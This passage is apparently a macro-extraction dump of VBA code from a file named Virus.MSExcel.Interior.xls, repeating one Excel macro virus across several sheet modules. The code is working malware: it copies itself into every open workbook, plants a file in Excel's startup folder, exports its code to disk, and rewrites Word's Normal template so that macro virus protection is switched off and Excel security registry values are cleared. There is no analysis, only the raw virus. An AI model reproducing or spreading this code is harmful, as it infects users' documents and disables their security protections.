Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
